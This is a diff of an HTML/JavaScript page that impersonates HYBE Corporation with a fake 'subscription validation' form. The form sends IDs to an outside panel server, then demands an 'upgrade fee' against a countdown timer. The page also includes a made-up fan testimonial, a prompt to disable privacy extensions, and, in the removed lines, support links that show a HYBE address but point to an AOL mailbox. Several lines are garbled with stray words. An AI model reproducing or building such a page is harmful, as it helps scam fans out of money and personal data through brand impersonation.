@@ -1,30 +1,31 @@
 <!DOCTYPE html>
-<html lang="en"> 
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="HYBE-CORP Subscription Validation - Secure your access to premium content.">
+  <meta name="description" content="HYBE-CORP Subscription Validation - Securely access premium content and exclusive artist experiences.">
   <meta name="author" content="HYBE CORP">
   <meta name="robots" content="index, follow">
   <meta property="og:title" content="HYBE-CORP: Subscription Validation">
-  <meta property="og:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
+  <meta property="og:description" content="Validate your HYBE Corporation subscription to unlock premium content and connect with your favorite artists.">
   <meta property="og:image" content="https://logotyp.us/file/hybe.svg">
   <meta property="og:url" content="https://hybecorp-permitvalidator.vercel.app">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="HYBE-CORP: Subscription Validation">
-  <meta name="twitter:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
+  <meta name="twitter:description" content="Validate your HYBE Corporation subscription to unlock premium content and connect with your favorite artists.">
   <meta name="twitter:image" content="https://logotyp.us/file/hybe.svg">
   <title>HYBE-CORP: Subscription Validation</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
-
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18/umd/react-dom.production.min.js"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-    
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto+Mono:wght@400&display=swap');
+
     :root {
       --primary-color: #1a365d;
       --secondary-color: #2d3748;
@@ -33,7 +34,9 @@
       --warning-color: #d69e2e;
       --error-color: #e53e3e;
       --background-gradient: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
-      --card-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      --card-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+      --dark-bg: #1a202c;
+      --dark-text: #e2e8f0;
     }
 
     * {
@@ -43,31 +46,41 @@
     }
 
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: 'Poppins', 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       background: var(--background-gradient);
       color: var(--secondary-color);
-      overflow-x: hidden;
       line-height: 1.6;
       position: relative;
+      transition: background 0.3s, color 0.3s;
     }
 
-    body::before {
-      content: '';
+    body.dark-mode {
+      background: var(--dark-bg);
+      color: var(--dark-text);
+    }
+
+    #particles-js {
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: url('https://via.placeholder.com/1920x1080?text=HYBE+Background') no-repeat center center/cover;
-      opacity: 0.1;
       z-index: -1;
+      opacity: 0.3;
     }
 
-    .container {
-      margin-top: 80px;
-      max-width: 480px;
-      z-index: 10;
-      position: relative;
+    .navbar {
+      background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .navbar-brand img {
+      height: 40px;
+    }
+
+    .container-main {
+      max-width: 600px;
+      margin: 80px auto;
       padding: 0 20px;
       display: flex;
       flex-direction: column;
@@ -75,28 +88,20 @@
       min-height: calc(100vh - 200px);
     }
 
-    .logo-container {
-      text-align: center;
-      margin-bottom: 32px;
-    }
-
-    .logo-container img {
-      height: 160px;
-      max-width: 90%;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
     .card {
       background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(12px);
       border-radius: 16px;
       box-shadow: var(--card-shadow);
-      padding: 48px 40px;
+      padding: 2.5rem;
+      border: 1px solid rgba(255, 255, 255, 0.2);
       position: relative;
-      z-index: 1;
+      overflow: hidden;
+    }
+
+    .dark-mode .card {
+      background: rgba(45, 55, 72, 0.95);
+      border-color: rgba(255, 255, 255, 0.1);
     }
 
     .card::before {
@@ -112,73 +117,61 @@
 
     .form-control {
       border: 2px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 16px 20px;
-      font-size: 16px;
-      font-weight: 500;
-      transition: all 0.2s ease;
-      background: rgba(255, 255, 255, 0.8);
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-family: 'Roboto Mono', monospace;
+      font-size: 1rem;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .dark-mode .form-control {
+      background: #2d3748;
+      color: var(--dark-text);
+      border-color: #4a5568;
     }
 
     .form-control:focus {
       border-color: var(--accent-color);
-      box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.1);
-      background: rgba(255, 255, 255, 1);
+      box-shadow: 0 0 0 4px rgba(49, 130, 206, 0.2);
+      outline: none;
     }
 
-    .form-control:valid {
+    .form-control.is-valid {
       border-color: var(--success-color);
       background: rgba(56, 161, 105, 0.1);
     }
 
-    .form-control:invalid:focus {
+    .form-control.is-invalid {
       border-color: var(--error-color);
-      box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.1);
+      background: rgba(229, 62, 62, 0.1);
     }
 
-    .form-control:invalid ~ .form-text::before {
-      content: "⚠️ Invalid format. Use 10-20 alphanumeric characters.";
-      color: var(--error-color);
-      display: block;
-      margin-bottom: 8px;
+    .form-text {
+      font-size: 0.85rem;
+      color: var(--secondary-color);
+    }
+
+    .dark-mode .form-text {
+      color: var(--dark-text);
     }
 
     .btn-primary {
-      background: linear-gradient(135deg, var(--primary-color) 0%, var(--accent-color) 100%);
+      background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
       border: none;
-      border-radius: 12px;
-      font-size: 16px;
+      border-radius: 10px;
+      font-size: 1rem;
       font-weight: 600;
-      padding: 16px 32px;
-      transition: all 0.3s ease;
-      text-transform: none;
-      letter-spacing: 0.025em;
-      position: relative;
-      overflow: hidden;
+      padding: 12px;
+      transition: transform 0.2s, box-shadow 0.2s;
     }
 
     .btn-primary:hover {
-     Corrected instruction: transform: translateY(-2px);
-      box-shadow: 0 8px 15px rgba(49, 130, 206, 0.3);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(49, 130, 206, 0.3);
     }
 
     .btn-primary:active {
       transform: translateY(0);
-    }
-
-    .btn-primary::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-      transition: left 0.5s;
-    }
-
-    .btn-primary:hover::before {
-      left: 100%;
     }
 
     .security-badge {
@@ -187,132 +180,195 @@
       gap: 8px;
       background: rgba(56, 161, 105, 0.1);
       color: var(--success-color);
-      padding: 8px 16px;
+      padding: 6px 12px;
       border-radius: 20px;
-      font-size: 0.875rem;
+      font-size: 0.85rem;
       font-weight: 500;
-      margin-bottom: 24px;
     }
 
     .timer-container {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
       background: rgba(255, 255, 255, 0.95);
-      padding: 16px;
-      border-radius: 12px;
-      margin-top: 20px;
+      padding: 12px;
+      border-radius: 10px;
       border: 1px solid var(--accent-color);
       text-align: center;
     }
 
+    .dark-mode .timer-container {
+      background: rgba(45, 55, 72, 0.95);
+    }
+
     .timer-unit {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      flex: 1;
     }
 
     .timer-value {
-      font-size: 1.5rem;
+      font-size: 1.25rem;
       font-weight: 600;
       color: var(--primary-color);
-      display: inline-block;
+    }
+
+    .dark-mode .timer-value {
+      color: var(--dark-text);
     }
 
     .timer-label {
-      font-size: 0.75rem;
+      font-size: 0.7rem;
       text-transform: uppercase;
       color: var(--secondary-color);
     }
 
+    .dark-mode .timer-label {
+      color: var(--dark-text);
+    }
+
     .timer-static {
-      background: rgba Meltano Platform, 255, 255, 255, 0.95);
-      padding: 16px;
-      border-radius: 12px;
-      margin-top: 20px;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 12px;
+      border-radius: 10px;
       border: 1px solid var(--accent-color);
       color: var(--primary-color);
       font-weight: 500;
       text-align: center;
     }
 
-    @keyframes fadeNumber {
-      0% { opacity: 0; transform: translateY(10px); }
-      100% { opacity: 1; transform: translateY(0); }
+    .dark-mode .timer-static {
+      background: rgba(45, 55, 72, 0.95);
+      color: var(--dark-text);
     }
 
-    .timer-value.animate {
-      animation: fadeNumber 0.3s ease-in-out;
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    @media (prefers-reduced-motion: reduce) {
-      .timer-value.animate {
-        animation: none;
-      }
+    .animate {
+      animation: fadeInUp 0.3s ease-in-out;
     }
 
     footer {
-      text-align: center;
       background: var(--primary-color);
       color: white;
-      padding: 40px 0;
-      margin-top: 80px;
+      padding: 2rem 0;
+      margin-top: 3rem;
+    }
+
+    .dark-mode footer {
+      background: #2d3748;
     }
 
     footer a {
       color: #ffd700;
-      position: relative;
       text-decoration: none;
-      transition: color 0.3s ease;
+      transition: color 0.3s;
     }
 
-    footer a::after {
-      content: '';
-      position: absolute;
-      width: 0;
-      height: 2px;
-      bottom: -2px;
-      left: 0;
-      background-color: #ffd700;
-      transition: width 0.3s ease;
+    footer a:hover {
+      color: var(--accent-color);
     }
 
-    footer a:hover::after {
-      width: 100%;
+    .social-links a {
+      font-size: 1.5rem;
+      margin: 0 10px;
     }
 
-    .footer-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 20px;
+    .testimonial-section {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 16px;
+      padding: 2rem;
+      margin-top: 2rem;
       text-align: center;
     }
 
-    #particles-js {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
+    .dark-mode .testimonial-section {
+      background: rgba(45, 55, 72, 0.95);
+    }
+
+    #dark-mode-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 1000;
+      background: var(--accent-color);
+      border: none;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    .dark-mode #dark-mode-toggle {
+      background: var(--dark-text);
+      color: var(--dark-bg);
+    }
+
+    @media (max-width: 576px) {
+      .container-main {
+        margin: 60px auto;
+        padding: 0 15px;
+      }
+
+      .card {
+        padding: 1.5rem;
+      }
+
+      .timer-container {
+        flex-wrap: wrap;
+        gap: 8px;
+      }
+
+      .timer-unit {
+        flex: 0 0 48%;
+      }
     }
   </style>
 </head>
 <body>
   <noscript>
-    <div class="container text-center mt-4" style="background: var(--error-color); color: white; padding: 20px; border-radius: 12px;">
-      <h2>JavaScript Required</h2>
-      <p>JavaScript is disabled in your browser. Please enable it to validate your subscription, or <a href="mailto:support@hybecorp.com" style="color: #ffd700;">contact support</a> for assistance.</p>
-      <p>Check our <a href="https://help.x.com/en/using-x" style="color: #ffd700;">Help Center</a> for supported browsers.</p>
+    <div class="container-main text-center mt-4">
+      <div class="alert alert-danger" role="alert">
+        <h2>JavaScript Required</h2>
+        <p>JavaScript is disabled in your browser. Please enable it to validate your subscription, or <a href="mailto:support@hybecorp.com" class="text-warning">contact support</a> for assistance.</p>
+        <p>Check our <a href="https://help.x.com/en/using-x" class="text-warning">Help Center</a> for supported browsers.</p>
+      </div>
     </div>
   </noscript>
 
   <div id="particles-js"></div>
+  <div id="chat-root"></div>
 
-  <div class="container" data-aos="fade-up">
-    <div class="logo-container">
-      <img src="https://logotyp.us/file/hybe.svg" alt="HYBE Logo">
+  <nav class="navbar navbar-expand-lg fixed-top">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="#">
+        <img src="https://logotyp.us/file/hybe.svg" alt="HYBE Logo">
+      </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item">
+            <a class="nav-link text-white" href="mailto:support@hybecorp.com">Support</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link text-white" href="https://help.x.com/en/using-x">Help Center</a>
+          </li>
+        </ul>
+      </div>
     </div>
+  </nav>
+
+  <button id="dark-mode-toggle" aria-label="Toggle dark mode">
+    <i class="bi bi-moon-stars-fill"></i>
+  </button>
+
+  <div class="container-main" data-aos="fade-up">
     <div class="card" data-aos="zoom-in" data-aos-delay="300">
       <div class="text-center mb-4">
         <div class="security-badge">
@@ -320,20 +376,19 @@
           <span>SSL Secured</span>
         </div>
       </div>
-      
-      <h1 class="text-center fw-bold mb-2" style="color: var(--primary-color); font-size: 1.75rem;">HYEPS License Validation</h1>
-      <p class="text-center mb-4" style="color: var(--secondary-color); font-size: 0.95rem;">Secure access to your HYBE Corporation subscription services</p>
-      
-      <form action="https://hybe-panel.onrender.com/verify" method="POST" onsubmit="validateSubscription(event)">
+      <h1 class="text-center fw-bold mb-3" style="font-size: 2rem; color: var(--primary-color);">HYBE License Validation</h1>
+      <p class="text-center mb-4 text-muted">Securely access your HYBE Corporation subscription services and exclusive artist content.</p>
+
+      <form action="https://hybe-panel.onrender.com/verify" method="POST" onsubmit="validateSubscription(event)" novalidate>
         <fieldset>
           <legend class="visually-hidden">Subscription Validation</legend>
           <div class="mb-4">
-            <label for="codeInput" class="form-label fw-semibold mb-2" style="color: var(--secondary-color);">Subscription ID</label>
+            <label for="codeInput" class="form-label fw-medium">Subscription ID</label>
             <input
               type="text"
               id="codeInput"
               class="form-control"
-              placeholder="Enter your Subscription ID (e.g., HYB123XYZ789)"
+              placeholder="e.g., HYB123XYZ789"
               pattern="[A-Z0-9]{10,20}"
               title="Subscription ID must be 10-20 alphanumeric characters"
               required
@@ -343,102 +398,116 @@
               spellcheck="false"
               aria-describedby="codeInputHelp"
             >
-            <div id="codeInputHelp" class="form-text mt-2" style="font-size: 0.8rem;">
-              <i class="bi bi-info-circle"></i> Your subscription ID is case-sensitive and contains 10-20 characters
+            <div id="codeInputHelp" class="form-text">
+              <i class="bi bi-info-circle"></i> Your Subscription ID is case-sensitive and contains 10-20 characters.
             </div>
           </div>
           <button type="submit" class="btn btn-primary w-100" id="validateBtn" aria-label="Validate Subscription ID">
             <span class="btn-text"><i class="bi bi-shield-check"></i> Validate Subscription</span>
-            <span class="btn-loading"><i class="bi bi-hourglass-split"></i> Processing...</span>
+            <span class="btn-loading d-none"><i class="bi bi-hourglass-split"></i> Processing...</span>
           </button>
         </fieldset>
       </form>
-      
-      <div class="text-center mt-4">
-        <small class="text-muted">
-          <i class="bi bi-lock-fill"></i> Your data is protected with enterprise-grade security
-        </small>
-      </div>
+
       <div class="text-center mt-3">
         <small class="text-muted">
-          <i class="bi bi-exclamation-triangle"></i> Some privacy extensions may interfere with validation. If you encounter issues, try disabling them or <a href="mailto:hybe.corp@aol.com" style="color: var(--accent-color);">contact support</a>.
+          <i class="bi bi-lock-fill"></i> Your data is protected with enterprise-grade security.
+        </small>
+      </div>
+      <div class="text-center mt-2">
+        <small class="text-muted">
+          <i class="bi bi-exclamation-triangle"></i> Some privacy extensions may interfere with validation. <a href="#" data-bs-toggle="modal" data-bs-target="#privacyModal" class="text-accent">Learn more</a>.
         </small>
       </div>
       <div class="mt-4">
         <details>
-          <summary style="cursor: pointer; color: var(--accent-color); font-weight: 600;">
+          <summary class="text-accent fw-medium" style="cursor: pointer;">
             <i class="bi bi-question-circle"></i> How to find your Subscription ID
           </summary>
-          <div style="background: rgba(255, 255, 255, 0.9); padding: 16px; border-radius: 8px; margin-top: 8px;">
-            <p>Your Subscription ID is a 10-20 character alphanumeric code provided in your HYBE account email or dashboard. It looks like <strong>HYB123XYZ789</strong>. Check your email or contact <a href="mailto:hybe.corp@aol.com" style="color: var(--accent-color);">support@hybecorp.com</a>.</p>
+          <div class="p-3 bg-light rounded-3 mt-2">
+            <p class="mb-0">Your Subscription ID is a 10-20 character alphanumeric code found in your HYBE account email or dashboard (e.g., <strong>HYB123XYZ789</strong>). Contact <a href="mailto:support@hybecorp.com" class="text-accent">support@hybecorp.com</a> if you need help.</p>
           </div>
         </details>
+      </div>
+    </div>
+
+    <div class="testimonial-section" data-aos="fade-up" data-aos-delay="500">
+      <h3 class="fw-medium mb-3">What Our Fans Say</h3>
+      <p class="text-muted">"HYBE’s subscription service makes it so easy to stay connected with BTS and TXT! The validation process is quick and secure." – Sarah K., ARMY</p>
+    </div>
+  </div>
+
+  <!-- Privacy Modal -->
+  <div class="modal fade" id="privacyModal" tabindex="-1" aria-labelledby="privacyModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="privacyModalLabel">Privacy Extensions</h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          <p>Some privacy-related browser extensions may interfere with the validation process or chat functionality. If you encounter issues, try disabling extensions like ad blockers or privacy guards and refresh the page. For assistance, contact <a href="mailto:support@hybecorp.com" class="text-accent">support@hybecorp.com</a>.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+        </div>
       </div>
     </div>
   </div>
 
   <footer>
     <div class="container">
-      <div class="footer-grid">
-        <div>
+      <div class="row text-center text-md-start">
+        <div class="col-md-4 mb-3">
           <h6 class="fw-bold">HYBE Corporation</h6>
-          <p class="small mb-0">Leading entertainment & technology company</p>
-          <div class="mt-3">
-            <a href="https://www.linkedin.com/company/hybe-corp/" target="_blank" rel="noopener" style="color: #0e76a8; font-size: 1.5rem; margin: 0 8px;"><i class="bi bi-linkedin"></i></a>
-            <a href="https://twitter.com/HYBEOFFICIALtwt" target="_blank" rel="noopener" style="color: #1da1f2; font-size: 1.5rem; margin: 0 8px;"><i class="bi bi-twitter"></i></a>
-            <a href="https://www.instagram.com/hybe.labels/" target="_blank" rel="noopener" style="color: #e1306c; font-size: 1.5rem; margin: 0 8px;"><i class="bi bi-instagram"></i></a>
-            <a href="https://www.facebook.com/HYBE.official" target="_blank" rel="noopener" style="color: #4267B2; font-size: 1.5rem; margin: 0 8px;"><i class="bi bi-facebook"></i></a>
+          <p class="small">Leading entertainment & technology for fans worldwide.</p>
+          <div class="social-links">
+            <a href="https://www.linkedin.com/company/hybe-corp/" target="_blank" rel="noopener"><i class="bi bi-linkedin"></i></a>
+            <a href="https://twitter.com/HYBEOFFICIALtwt" target="_blank" rel="noopener"><i class="bi bi-twitter"></i></a>
+            <a href="https://www.instagram.com/hybe.labels/" target="_blank" rel="noopener"><i class="bi bi-instagram"></i></a>
+            <a href="https://www.facebook.com/HYBE.official" target="_blank" rel="noopener"><i class="bi bi-facebook"></i></a>
           </div>
         </div>
-        <div>
+        <div class="col-md-4 mb-3">
           <h6 class="fw-bold">Support</h6>
-          <p class="small mb-1">
-            <a href="mailto:hybe.corp@aol.com" style="color: #cbd5e0; text-decoration: none;">support@hybecorp.com</a>
-          </p>
-          <p class="small mb-0">24/7 Customer Service</p>
+          <p class="small"><a href="mailto:support@hybecorp.com">support@hybecorp.com</a></p>
+          <p class="small">24/7 Customer Service</p>
         </div>
-        <div>
+        <div class="col-md-4 mb-3">
           <h6 class="fw-bold">Security</h6>
-          <p class="small mb-0">
-            <i class="bi bi-shield-fill-check"></i> Enterprise Security
-          </p>
+          <p class="small"><i class="bi bi-shield-fill-check"></i> Enterprise-Grade Security</p>
         </div>
       </div>
-      <hr style="border-color: #4a5568; margin: 30px 0;">
+      <hr class="my-4" style="border-color: #4a5568;">
       <div class="d-flex justify-content-between align-items-center flex-wrap">
-        <p class="mb-0 small">© 2025 HYBE Corporation. All rights reserved.</p>
+        <p class="small mb-0">© 2025 HYBE Corporation. All rights reserved.</p>
         <div class="small">
-          <a href="#" style="color: #cbd5e0; text-decoration: none; margin: 0 10px;">Privacy Policy</a>
-          <a href="#" style="color: #cbd5e0; text-decoration: none; margin: 0 10px;">Terms of Service</a>
+          <a href="#" class="me-3">Privacy Policy</a>
+          <a href="#" class="me-3">Terms of Service</a>
+          <a href="https://help.x.com/en/using-x">Help Center</a>
         </div>
       </div>
     </div>
   </footer>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  <!-- Smartsupp Live Chat script -->
+  <script src="/index.js"></script> <!-- React bundle for chat widget -->
+
   <script>
-    var _smartsupp = _smartsupp || {};
-    _smartsupp.key = '95a4146044c039bddfd0d3c872316d5187481695'; // Your Smartsupp key
-    _smartsupp.widget = 'hidden'; // Hide chat widget by default
-    window.smartsupp||(function(d) {
-      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-      c.type='text/javascript';c.charset='utf-8';c.async=true;
-      c.src='https://www.smartsuppchat.com/loader.js';s.parentNode.insertBefore(c,s);
-    })(document);
-  </script>
-  <script>
-    AOS.init();
+    AOS.init({
+      duration: 800,
+      once: true,
+    });
+
     particlesJS("particles-js", {
       particles: {
-        number: { value: 80, density: { enable: true, value_area: 800 } },
+        number: { value: 50, density: { enable: true, value_area: 1000 } },
         shape: { type: "circle" },
-        opacity: { value: 0.4, random: true, anim: { enable: true, speed: 1, opacity_min: 0 } },
-        size: { value: 3, random: true, anim: { enable: false } },
-        line_linked: { enable: true, distance: 150, color: "#007bff", opacity: 0.4, width: 1 }
+        opacity: { value: 0.3, random: true, anim: { enable: true, speed: 0.5, opacity_min: 0 } },
+        size: { value: 3, random: true },
+        line_linked: { enable: true, distance: 150, color: var(--accent-color), opacity: 0.3, width: 1 }
       },
       interactivity: {
         detect_on: "canvas",
@@ -449,9 +518,23 @@
       }
     });
 
+    // Dark mode toggle
+    document.getElementById('dark-mode-toggle').addEventListener('click', () => {
+      document.body.classList.toggle('dark-mode');
+      const icon = document.querySelector('#dark-mode-toggle i');
+      icon.classList.toggle('bi-moon-stars-fill');
+      icon.classList.toggle('bi-sun-fill');
+      localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
+    });
+
+    // Load dark mode preference
+    if (localStorage.getItem('darkMode') === 'true') {
+      document.body.classList.add('dark-mode');
+      document.querySelector('#dark-mode-toggle i').classList.replace('bi-moon-stars-fill', 'bi-sun-fill');
+    }
+
     async function validateSubscription(event) {
-      if (event) event.preventDefault();
-      
+      event.preventDefault();
       const subscriptionId = document.getElementById("codeInput").value.trim();
       const submitBtn = document.getElementById("validateBtn");
 
@@ -467,7 +550,8 @@
       }
 
       submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="bi bi-hourglass-split"></i> <span>Processing...</span>';
+      submitBtn.querySelector('.btn-text').classList.add('d-none');
+      submitBtn.querySelector('.btn-loading').classList.remove('d-none');
 
       showProgressLoader();
 
@@ -487,10 +571,7 @@
         if (contentType && contentType.includes("application/json")) {
           result = await response.json();
         } else {
-          showErrorAlert(
-            'Server Error',
-            'Received an unexpected response from the server. Please try again later.'
-          );
+          showErrorAlert('Server Error', 'Received an unexpected response from the server. Please try again later.');
           return;
         }
 
@@ -513,25 +594,21 @@
             title: 'Subscription ID Validated',
             html: `
               <div style="text-align: left; max-width: 500px; margin: 0 auto;">
-                <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
-                  <h5 style="color: #1a365d; margin-bottom: 15px;"><i class="bi bi-person-circle"></i> Account Information</h5>
-                  <p><-strong>Full Name:</strong> ${result.Full_name || "N/A"}</p>
+                <div class="bg-light p-3 rounded-3 mb-3">
+                  <h5 class="text-primary mb-3"><i class="bi bi-person-circle"></i> Account Information</h5>
+                  <p><strong>Full Name:</strong> ${result.Full_name || "N/A"}</p>
                   <p><strong>Status:</strong> ${result.Status || "N/A"}</p>
                   <p><strong>Activation:</strong> ${new Date(result.Activation_Date).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }) || "N/A"}</p>
                   <p><strong>Upgrade Due By:</strong> ${staticExpiration || "N/A"}</p>
                 </div>
-                
-                <div style="background: #fff3cd; padding: 20px; border-radius: 8px; border-left: 4px solid #ffc107;">
-                  <h5 style="color: #856404; margin-bottom: 15px;"><i class="bi bi-exclamation-triangle-fill"></i> Upgrade Required</h5>
+                <div class="bg-warning-subtle p-3 rounded-3 border-start border-4 border-warning">
+                  <h5 class="text-warning mb-3"><i class="bi bi-exclamation-triangle-fill"></i> Upgrade Required</h5>
                   <p><strong>Current Level:</strong> ${result.Current_ID_Level || "N/A"}</p>
                   <p><strong>License Status:</strong> ${result.HYBE_Chat_License_info || "N/A"}</p>
                   <p><strong>Upgrade Fee:</strong> ${result.HYBE_GOLDEN_Upgrade_fee || "N/A"}</p>
                 </div>
-                
-                <div class="timer-container" id="countdown-timer" aria-live="polite">
-                  <p style="font-size: 14px; color: #1a365d; margin-bottom: 10px;">
-                    <i class="bi bi-clock-fill"></i> Time remaining to upgrade to HYBE-GOLDEN:
-                  </p>
+                <div class="timer-container mt-3" id="countdown-timer" aria-live="polite">
+                  <p class="small text-primary mb-2"><i class="bi bi-clock-fill"></i> Time to upgrade to HYBE-GOLDEN:</p>
                   <div class="timer-unit">
                     <span class="timer-value" id="days">0</span>
                     <span class="timer-label">Days</span>
@@ -546,20 +623,16 @@
                   </div>
                   <div class="timer-unit">
                     <span class="timer-value" id="seconds">0</span>
-                    <span class="timer和社会">Seconds</span>
+                    <span class="timer-label">Seconds</span>
                   </div>
                 </div>
                 <noscript>
-                  <div class="timer-static">
+                  <div class="timer-static mt-3">
                     Your subscription ID is validated. You must upgrade to HYBE-GOLDEN by ${staticExpiration}.
                   </div>
                 </noscript>
-                
-                <div style="background: #d1ecf1; padding: 15px; border-radius: 8px; margin-top: 20px;">
-                  <p style="margin: 0; font-size: 14px; color: #0c5460;">
-                    <i class="bi bi-info-circle-fill"></i> 
-                    Your subscription ID has been validated. Please upgrade to HYBE-GOLDEN within 30 days to access premium features. Contact our support team for assistance.
-                  </p>
+                <div class="bg-info-subtle p-3 rounded-3 mt-3">
+                  <p class="small text-info mb-0"><i class="bi bi-info-circle-fill"></i> Your subscription ID has been validated. Upgrade to HYBE-GOLDEN within 30 days to access premium features. Contact our support team for assistance.</p>
                 </div>
               </div>
             `,
@@ -571,24 +644,14 @@
             footer: `<small>Support Reference: ${result.support_reference || 'N/A'}</small>`
           }).then((result) => {
             if (result.isConfirmed) {
-              // Open Smartsupp chat instead of mailto link
-              if (window.smartsupp) {
-                window.smartsupp('chat:open');
-              } else {
-                Swal.fire({
-                  icon: 'error',
-                  title: 'Chat Unavailable',
-                  text: 'Unable to load the support chat. Please try again or email support@hybecorp.com.',
-                  confirmButtonColor: '#e53e3e'
-                });
-              }
+              document.querySelector('.chat-toggle').click(); // Open custom chat widget
             }
           });
 
           startCountdownTimer(expirationDate);
         } else {
           showErrorAlert(
-            'Verification Failed', 
+            'Verification Failed',
             result.message || 'Invalid subscription credentials.',
             result.support_reference ? `Support Reference: ${result.support_reference}` : null
           );
@@ -596,12 +659,13 @@
       } catch (error) {
         console.error('Validation error:', error);
         showErrorAlert(
-          'Connection Error', 
+          'Connection Error',
           'Unable to connect to validation servers. Please check your connection and try again.'
         );
       } finally {
         submitBtn.disabled = false;
-        submitBtn.innerHTML = '<i class="bi bi-shield-check"></i> <span>Validate Subscription</span>';
+        submitBtn.querySelector('.btn-text').classList.remove('d-none');
+        submitBtn.querySelector('.btn-loading').classList.add('d-none');
       }
     }
 
@@ -659,7 +723,7 @@
       updateTimer();
       const timerInterval = setInterval(updateTimer, 1000);
 
-      document.addEventListener('click', function(event) {
+      document.addEventListener('click', (event) => {
         if (event.target.closest('.swal2-confirm') || event.target.closest('.swal2-cancel')) {
           clearInterval(timerInterval);
         }
@@ -682,10 +746,12 @@
       let progress = 0;
       Swal.fire({
         title: 'Validating ID...',
-        html: `<div id="progressText">Validating: <b>0%</b></div>
-               <div style="background: #ddd; height: 10px; border-radius: 5px; margin-top: 10px;">
